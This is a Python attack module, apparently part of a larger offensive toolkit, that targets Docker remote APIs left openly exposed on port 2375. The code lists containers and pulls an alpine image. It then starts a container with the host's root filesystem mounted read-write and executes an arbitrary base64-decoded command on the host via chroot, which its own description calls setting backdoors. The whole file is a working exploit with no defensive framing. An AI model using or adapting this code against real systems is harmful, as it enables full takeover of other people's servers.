#!/usr/bin/env python
# coding: UTF-8
import requests
import json
import sys
import base64

class AtkDockerApi(object):
    def __init__(self, utility, host="127.0.0.1", port="2375", debug=False):
        self.utility = utility
        self.host = host
        self.port = port
        self.debug = debug
        self.description = "The module can be set some backdoors if Docker API was open publicaly."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkDockerApi object (target: %s, description: %s)' % (self.target, self.description)

    __repr__ = __str__
    
    def sendattack(self, b64data):
        targethost = self.target
        payload = base64.b64decode(b64data.encode()).decode()

        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}
         
        #connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        try:
            self.logger("Attack Start", "+")

            session = requests.Session()
            target_url1 = "http://" + targethost + "/containers/json?all=1"
            
            # get docker information
            response1 = session.get(target_url1, proxies=proxies, timeout=timeoutvalue)
            
            print("-----Get docker info-----")
            print(response1.text)

            # pull image
            target_url2 = "http://" + targethost + "/images/create?fromImage=alpine&tag=latest"
            response2 = session.post(target_url2, proxies=proxies, timeout=timeoutvalue)

            print("-----Pull alpine image-----")
            print(response2.text)

            # make container image
            json_data = { "Image": "alpine", "Cmd": ["/bin/sh"], "Tty":True, "HostConfig": { "Binds": ["/:/mnt:rw"] } }
            headers = { "Content-Type": "application/json" }

            target_url3 = "http://" + targethost + "/containers/create"
            response3 = session.post(target_url3, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

            print("-----Create container images-----")
            print(response3.text)

            rjsondata1 = response3.json()

            # execute container
            target_url4 = "http://" + targethost + "/containers/" + rjsondata1["Id"] + "/start"
            response4 = session.post(target_url4, proxies=proxies, timeout=timeoutvalue)

            print("-----Start container images-----")
            print(response4.text)        
            print("execute command: "+ payload)

            # make command
            json_data = { "AttachStderr":True, "AttachStdin":True, "AttachStdout":True, "Tty": True, "Cmd": [ "chroot", "/mnt", "/bin/sh", "-c", payload] }
            headers = { "Content-Type": "application/json" }

            target_url5 = "http://" + targethost + "/containers/" + rjsondata1["Id"] + "/exec"
            response5 = session.post(target_url5, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)
            self.logger("json_data:"+json.dumps(json_data)+", url:"+target_url5, "+")


            print("-----Set Comand-----")
            print(response5.text)
            rjsondata2 = response5.json()


            # execute command on container
            json_data = { "Detach": True, "Tty": True }
            headers = { "Content-Type": "application/json" }

            target_url6 = "http://" + targethost + "/exec/" + rjsondata2["Id"] + "/start"
            response6 = session.post(target_url6, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)


            print("-----Run Comand------")
            print(response6.text)

            self.logger("Attack Complete!!", "+")
            return True

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            return False
            #sys.exit(1)

    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)

